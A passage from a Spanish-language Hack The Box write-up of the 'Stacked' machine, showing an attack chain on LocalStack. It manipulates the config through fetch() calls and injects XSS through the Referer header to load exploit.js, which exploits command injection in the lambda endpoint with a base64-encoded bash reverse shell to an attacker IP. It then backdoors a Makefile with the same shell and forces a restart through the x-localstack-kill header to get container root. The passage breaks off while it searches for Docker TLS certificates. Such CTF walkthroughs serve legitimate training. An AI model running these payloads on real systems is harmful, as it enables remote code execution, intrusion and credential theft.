</code></pre></div><p>Ahora podemos configurar algunas variables: <code>FORWARD_EDGE_INMEM</code> con valor <code>False</code> y <code>HOSTNAME</code> que contenga nuestra dirección IP de atacante (<code>172.16.33.1</code>).</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://127.0.0.1:4566</span><span class=mtk4>'</span><span class=mtk1>)</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>text</span><span class=mtk1>())</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class=mtk1>console</span><span class=mtk1>.</span><span class=mtk8>log</span><span class=mtk1>)</span>

<span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://127.0.0.1:4566/?_config_</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>{</span>
  <span class=mtk1>body</span><span class=mtk1>:</span> <span class=mtk1>JSON</span><span class=mtk1>.</span><span class=mtk8>stringify</span><span class=mtk1>({</span>
    <span class=mtk1>variable</span><span class=mtk1>:</span> <span class=mtk4>'FORWARD_EDGE_INMEM'</span><span class=mtk1>,</span>
    <span class=mtk1>value</span><span class=mtk1>:</span> <span class=mtk6>false</span>
  <span class=mtk1>}),</span>
  <span class=mtk1>headers</span><span class=mtk1>:</span> <span class=mtk1>{</span> <span class=mtk4>'Content-Type'</span><span class=mtk1>:</span> <span class=mtk4>'application/json'</span> <span class=mtk1>},</span>  
  <span class=mtk1>method</span><span class=mtk1>:</span> <span class=mtk4>'post'</span>
<span class=mtk1>})</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>text</span><span class=mtk1>())</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class=mtk1>console</span><span class=mtk1>.</span><span class=mtk8>log</span><span class=mtk1>)</span>

<span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://127.0.0.1:4566/?_config_</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>{</span>
  <span class=mtk1>body</span><span class=mtk1>:</span> <span class=mtk1>JSON</span><span class=mtk1>.</span><span class=mtk8>stringify</span><span class=mtk1>({</span>
    <span class=mtk1>variable</span><span class=mtk1>:</span> <span class=mtk4>'HOSTNAME'</span><span class=mtk1>,</span>
    <span class=mtk1>value</span><span class=mtk1>:</span> <span class=mtk4>'172.16.33.1'</span>
  <span class=mtk1>}),</span>
  <span class=mtk1>headers</span><span class=mtk1>:</span> <span class=mtk1>{</span> <span class=mtk4>'Content-Type'</span><span class=mtk1>:</span> <span class=mtk4>'application/json'</span> <span class=mtk1>},</span>
  <span class=mtk1>method</span><span class=mtk1>:</span> <span class=mtk4>'post'</span><span class=mtk1>,</span>
<span class=mtk1>})</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>text</span><span class=mtk1>())</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class=mtk1>console</span><span class=mtk1>.</span><span class=mtk8>log</span><span class=mtk1>)</span>
</code></pre></div><p>Y ahora vemos que LocalStack responde:</p><p><img src=/images/HTB/Stacked/Stacked-localstack-mitm-proxy.png alt="LocalStack MITM proxy"></p><p>Además, las variables se muestran en el <em>log</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-cyan>localstack_main  |</span> INFO:localstack.services.infra: Updating value of config variable "HOSTNAME": 172.16.33.1
<span class=code-dark-cyan>localstack_main  |</span> INFO:localstack.services.infra: Updating value of config variable "FORWARD_EDGE_INMEM": False  
</code></pre></div><p>Con esto, hemos configurado LocalStack para que todas las peticiones pasen por nuestra dirección IP de atacante. Podemos verificarlo con <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4566
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4566
Ncat: Listening on 0.0.0.0:4566
Ncat: Connection from 172.16.33.1.
Ncat: Connection from 172.16.33.1:56875.
GET /shell/ HTTP/1.1
Remote-Addr: 172.17.0.1
Host: localhost:4566
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Thu, 28 May 2020 17:39:06 GMT
Cache-Control: max-age=0
X-Forwarded-For: 172.17.0.1, localhost:4566
x-localstack-edge: https://localhost:4566
Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  
</code></pre></div><p>Y si vamos a <code>http://localhost:4566/shell/</code> (página web legítima), no vemos nada:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://localhost:4566/shell/  
{}
</code></pre></div><p>Ahora controlamos también las respuestas. Podemos escribir un servidor HTTP con Python y Flask:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">flask</span> <span class=mtk5>import</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>,</span> <span class=mtk1>request</span>

<span class=mtk1>app</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>(</span><span class=mtk1>__name__</span><span class=mtk1>)</span>


<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/shell/'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>shell</span><span class=mtk1>():</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk1>headers</span><span class=mtk1>)</span>
    <span class=mtk5>return</span> <span class=mtk4>'Hacked!!'</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>run</span><span class=mtk1>(</span><span class="mtk9 mtki">host</span><span class=mtk5>=</span><span class=mtk4>'172.16.33.1'</span><span class=mtk1>,</span> <span class="mtk9 mtki">port</span><span class=mtk5>=</span><span class=mtk6>4566</span><span class=mtk1>)</span>  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> app.py
 * Serving Flask app 'app' (lazy loading)
 * Environment: production
   <span class=code-dark-red>WARNING: This is a development server. Do not use it in a production deployment.</span>
   <span class=code-dark-grey>Use a production WSGI server instead.</span>
 * Debug mode: off
 * Running on http://172.16.33.1:4566/ (Press CTRL+C to quit)
Remote-Addr: 172.17.0.1
Host: localhost:4566
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
X-Forwarded-For: 172.17.0.1, localhost:4566
X-Localstack-Edge: https://localhost:4566
Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  


172.16.33.1 - - [] "GET /shell/ HTTP/1.1" 200 -
</code></pre></div><p><img src=/images/HTB/Stacked/Stacked-localstack-mitm-proxy-hacked.png alt="LocalStack MITM proxy hacked"></p><p>Y con esto, ya tenemos control total sobre las peticiones y respuestas de LocalStack.</p><h2 id=comprometiendo-localstack-rce>Comprometiendo LocalStack. RCE</h2><p>Existe también un vector de ataque que puede derivar en ejecución remota de comandos (RCE) en el contenedor al acceder a <code>/lambda/&lt;functionName>/code</code> (el parámetro <code>functionName</code> es vulnerable a inyección e comandos) mediante una petición POST (también explicado en <a href=(https://blog.sonarsource.com/hack-the-stack-with-localstack)>SonarSource</a>).</p><p>Para probarlo, reiniciaré el contenedor de Docker y lanzaré esta petición:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'127.0.0.1:8080/lambda/;curl%20172.16.33.1/code'</span> -d <span class=code-dark-yellow>'{"awsEnvironment":""}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;  
</code></pre></div><p>Y se recibe una petición de vuelta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 172.16.33.1.
Ncat: Connection from 172.16.33.1:50609.
GET / HTTP/1.1
Host: 172.16.33.1
User-Agent: curl/7.67.0
Accept: */*
</code></pre></div><p>Por tanto, podríamos incluso conseguir una <em>reverse shell</em> en el contenedor.</p><h2 id=encontrando-un-xss>Encontrando un XSS</h2><p>Podemos asumir que la máquina tiene un entorno de LocalStack en ejecución, por lo que podemos reproducir el vector de ataque mostrado en el blog y usar XSS para explotar la inyección de comandos y ganar acceso al contenedor (el <em>proxy</em> MITM no es necesario).</p><p>En primer lugar, necesitamos encontrar una entrada de usuario. El único que hay es un formulario de contacto en <code>http://portfolio.stacked.htb</code>:</p><p><img src=/images/HTB/Stacked/Stacked-contact.png alt="Stacked contact"></p><p>Si tratamos de usar un <em>payload</em> de XSS sencillo, el servidor lo bloquea:</p><p><img src=/images/HTB/Stacked/Stacked-contact-xss.png alt="Stacked contact XSS"></p><p>Podemos utilizar Burp Suite (Repeater) para probar más <em>payloads</em>. Mantendré <code>nc</code> escuchando en el puerto 80 para ver si algún <em>payload</em> se ejecuta.</p><p><img src=/images/HTB/Stacked/Stacked-burp.png alt="Burp Repeater"></p><p>Después de muchas pruebas, vemos que la cabecera <code>Referer</code> es inyectable:</p><p><img src=/images/HTB/Stacked/Stacked-burp-referer.png alt="Burp Referer"></p><p>Y recibimos una petición en <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:35146.
GET / HTTP/1.1
Host: 10.10.17.44
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
Upgrade-Insecure-Requests: 1
</code></pre></div><p>Aunque vemos otro subdominio llamado <code>mail.stacked.htb</code>, no podemos acceder a él. El servidor nos redirige:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -I mail.stacked.htb
HTTP/1.1 302 Found
<span class=code-white>Date</span>:
<span class=code-white>Server</span>: Apache/2.4.41 (Ubuntu)
<span class=code-white>Location</span>: http://stacked.htb/
<span class=code-white>Content-Type</span>: text/html; charset=iso-8859-1  
</code></pre></div><p>Además, <code>mail</code> es un subdominio bastante corriente y <code>ffuf</code> no lo encontró.</p><h2 id=intrusión-en-el-contenedor>Intrusión en el contenedor</h2><p>Entonces, explotaremos la vulnerabilidad de inyección de comandos en <code>/lambda/&lt;functionName>/code</code> para conseguir una <em>reverse shell</em> en el contenedor. El <em>payload</em> de <em>reverse shell</em> es el siguiente codificado en Base64:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>Ahora creamos este archivo de JavaScript (<code>exploit.js</code>) que realiza una petición POST como se mostró anteriormente en la explotación en local:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">const</span> <span class=mtk1>cmd</span> <span class=mtk5>=</span> <span class=mtk4>'echo</span> <span class=mtk4>YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class=mtk4>AwPiYx</span> <span class=mtk4>|</span> <span class=mtk4>base64</span> <span class=mtk4>-d</span> <span class=mtk4>|</span> <span class=mtk4>bash'</span>  

<span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>`</span><span class="mtk4 detected-link">http://127.0.0.1:8080/lambda/;</span><span class="mtk5 detected-link">${</span><span class="mtk7 detected-link">encodeURIComponent</span><span class="mtk1 detected-link">(</span><span class="mtk1 detected-link">cmd</span><span class="mtk1 detected-link">)</span><span class="mtk5 detected-link">}</span><span class="mtk4 detected-link">/code</span><span class=mtk4>`</span><span class=mtk1>,</span> <span class=mtk1>{</span>
  <span class=mtk1>body</span><span class=mtk1>:</span> <span class=mtk1>JSON</span><span class=mtk1>.</span><span class=mtk8>stringify</span><span class=mtk1>({</span> <span class=mtk1>awsEnvironment</span><span class=mtk1>:</span> <span class=mtk4>''</span> <span class=mtk1>}),</span>
  <span class=mtk1>headers</span><span class=mtk1>:</span> <span class=mtk1>{</span> <span class=mtk4>'Content-Type'</span><span class=mtk1>:</span> <span class=mtk4>'application/json'</span> <span class=mtk1>},</span>
  <span class=mtk1>method</span><span class=mtk1>:</span> <span class=mtk4>'post'</span>
<span class=mtk1>})</span>
</code></pre></div><p>Y encontes podemos iniciar un servidor HTTP con Python y enviar el formulario de contacto inyectando el <em>payload</em> de XSS en la cabecera <code>Referer</code> para cargar el archivo de JavaScript malicioso:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> portfolio.stacked.htb/process.php -H <span class=code-dark-yellow>'Referer: &lt;script src="http://10.10.17.44/exploit.js"&gt;&lt;/script&gt;'</span> -d <span class=code-dark-yellow>'tel=1&fullname=&email=&subject=&message='</span>  
{"success":"Your form has been submitted. Thank you!"}
</code></pre></div><p>El navegador de la víctima solicita el archivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.112 - - [] "GET /exploit.js HTTP/1.1" 200 -  
</code></pre></div><p>Y recibimos la <em>reverse shell</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:32822.
bash: cannot set terminal process group (20): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ python3 -c 'import pty; pty.spawn("/bin/bash")'  
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
bash-5.0$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
bash-5.0$ export TERM=xterm
bash-5.0$ export SHELL=bash
bash-5.0$ stty rows 50 columns 158
</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2><p>Lo primero que vemos es que no somos <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ whoami  
localstack
</code></pre></div><p>Veamos si existe algún volumen de datos compartido con la máquina anfitrión (<em>host</em>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                   7.3G      6.5G    691.7M  91% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                     1.9G         0      1.9G   0% /sys/fs/cgroup
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /tmp/localstack
df: /root/.docker: Permission denied
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/resolv.conf
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/hosts
shm                      64.0M         0     64.0M   0% /dev/shm
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /home/localstack/user.txt  
tmpfs                     1.9G         0      1.9G   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
tmpfs                     1.9G         0      1.9G   0% /proc/scsi
tmpfs                     1.9G         0      1.9G   0% /sys/firmware
</code></pre></div><p>Bueno, tenemos algunos montajes (<code>/tmp/localstack</code> en <code>/root/.docker</code> y <code>/home/localstack/user.txt</code>). En este punto podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ cat /home/localstack/user.txt  
c877918fc5f7cb38e0631f7849c20b1b
</code></pre></div><p>Si miramos de nuevo al archivo <code>docker-compose.yml</code>, vemos que <code>/tmp/localstack</code> se utiliza como montaje de volumen. Este directorio se usa para almacenar los certificados de cliente. Estos archivos serán útiles para conectarnos a Docker por el puerto 2376, por lo que tenemos que escalar a <code>root</code> en el contenedor.</p><h2 id=escalada-de-privilegios-en-el-contenedor>Escalada de privilegios en el contenedor</h2><p>Vamos a enumerar procesos en ejecución por parte de <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ ps -a | grep root
    1 root      0:00 {docker-entrypoi} /bin/bash /usr/local/bin/docker-entrypoint.sh
   14 root      0:15 {supervisord} /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf
   17 root      0:05 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
   21 root      0:00 make infra
   24 root      1:19 python bin/localstack start --host
   95 root      2:22 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -port 44759 -dbPath /var/localstack/data/dynamodb
  107 root      0:00 node /opt/code/localstack/localstack/node_modules/kinesalite/cli.js --shardLimit 100 --port 44677 --createStreamMs 500 --deleteStreamMs 500 --updateStreamMs 500 --path /var/localstack/data/kinesis  
159289 localsta  0:00 grep root
</code></pre></div><p>Existe un comando <code>make infra</code>, que ejeuta una lista de comandos en un cierto archivo llamado <code>Makefile</code>. Estos son todos los archivos llamados <code>Makefile</code> en el contenedor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ find / -name Makefile 2>/dev/null
/usr/local/lib/node_modules/npm/node_modules/columnify/Makefile
/usr/local/lib/node_modules/npm/node_modules/json-stringify-safe/Makefile
/usr/local/lib/node_modules/npm/node_modules/extsprintf/Makefile
/usr/local/lib/node_modules/npm/node_modules/retry/Makefile
/usr/local/lib/node_modules/npm/node_modules/delayed-stream/Makefile
/usr/local/lib/node_modules/npm/node_modules/delegates/Makefile
/usr/local/lib/node_modules/npm/node_modules/isarray/Makefile
/usr/local/lib/node_modules/npm/Makefile
/usr/share/groff/1.22.4/font/devlj4/generate/Makefile
/usr/share/groff/1.22.4/font/devps/generate/Makefile
/usr/share/groff/1.22.4/font/devdvi/generate/Makefile
/usr/lib/python3.8/config-3.8-x86_64-linux-gnu/Makefile
/opt/code/localstack/localstack/node_modules/leveldown/deps/leveldb/leveldb-1.20/Makefile  
/opt/code/localstack/localstack/dashboard/web/node_modules/debug/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/delayed-stream/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/superagent/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/isarray/Makefile
/opt/code/localstack/Makefile
</code></pre></div><p>El último parece más interesante, y de hecho tenemos permisos para modificar dicho archivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ ls -l /opt/code/localstack/Makefile
-rw-rw-r--    1 localsta localsta      8455 Feb  1  2021 /opt/code/localstack/Makefile  
</code></pre></div><p>Entonces, podemos escribir un comando que nos mande una <em>reverse shell</em>. Pero tenemos que averiguar cómo decirle a <code>root</code> que ejecute <code>make infra</code>, porque este tipo de comando se ejecuta normalmente solo una vez en el inicio.</p><p>Mirando en el <a href=https://github.com/localstack/localstack>proyecto de LocalStack en GitHub</a> usando GitHub Codespaces, podemos buscar por <code>restart</code>:</p><p><img src=/images/HTB/Stacked/Stacked-infra-restart.png alt="Infra restart"></p><p>Y vemos que hay un modo de matar el proceso incluso sin ser <code>root</code>. Ahora podemos buscar por <code>kill</code> y encontrar la manera de decirle a LocalStack que reinicie <code>infra</code> como <code>root</code>:</p><p><img src=/images/HTB/Stacked/Stacked-infra-kill.png alt="Infra kill"></p><p>Solamente hay que insertar una cabecera llamada <code>x-localstack-kill</code>. Por tanto, modificaremos el <code>Makefile</code> para añadir una <em>reverse shell</em> y reiniciaremos el servicio mientras escuchamos con <code>nc</code>.</p><p>Primero, cogemos el archivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ nc 10.10.17.44 4444 &lt; /opt/code/localstack/Makefile  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444 &gt; Makefile_orig
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:40781.

<span class=code-cyan>$</span> <span class=code-dark-green>cp</span> Makefile_orig Makefile_pwn
</code></pre></div><p>Y ahora lo modificamos. Este es el archivo <code>Makefile</code> modificado (nombrado <code>Makefile_pwn</code> en local):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#</span> <span class=mtk3>...</span>

<span class=mtk8>infra</span><span class=mtk1>:</span>             <span class=mtk3>##</span> <span class=mtk3>Manually</span> <span class=mtk3>start</span> <span class=mtk3>the</span> <span class=mtk3>local</span> <span class=mtk3>infrastructure</span> <span class=mtk3>for</span> <span class=mtk3>testing</span>
  <span class=mtk1>echo</span> <span class=mtk1>YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class=mtk1>AwPiYx</span> <span class=mtk1>|</span> <span class=mtk1>base64</span> <span class=mtk1>-d</span> <span class=mtk1>|</span> <span class=mtk1>bash</span>  
  <span class=mtk1>(</span><span class=mtk4>$(</span><span class=mtk1>VENV_RUN</span><span class=mtk4>)</span><span class=mtk1>;</span> <span class=mtk1>exec</span> <span class=mtk1>bin/localstack</span> <span class=mtk1>start</span> <span class=mtk1>--host)</span>

<span class=mtk3>#</span> <span class=mtk3>...</span>
</code></pre></div><p>Y finalmente, sobrescribimos el archivo existente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ curl 10.10.17.44/Makefile_pwn -so /opt/code/localstack/Makefile  
</code></pre></div><p>Ahora es el momento de reiniciar el servicio y ganar acceso como <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0$ curl 127.0.0.1:4566 -H 'x-localstack-kill: asdf'  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:56628.
bash: cannot set terminal process group (159315): Not a tty  
bash: no job control in this shell
bash-5.0# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.0# ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
bash-5.0# export TERM=xterm
bash-5.0# export SHELL=bash
bash-5.0# stty rows 50 columns 158
</code></pre></div><h2 id=escalada-de-privilegios-en-la-máquina>Escalada de privilegios en la máquina</h2><p>Genial, somos <code>root</code> en el contenedor. Ahora podemos buscar los certificados requeridos para interactuar con Docker en el puerto 2376:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# find / -name \*.pem\* 2>/dev/null | grep -v etc
/tmp/localstack/server.test.pem.key
/tmp/localstack/server.test.pem.crt
/tmp/localstack/server.test.pem
/tmp/tmpiwxfx4eh.pem
/tmp/tmpiwxfx4eh.pem.crt
/tmp/tmpiwxfx4eh.pem.key
/usr/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem
/usr/lib/python3.8/site-packages/certifi/cacert.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-key.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-crt.pem
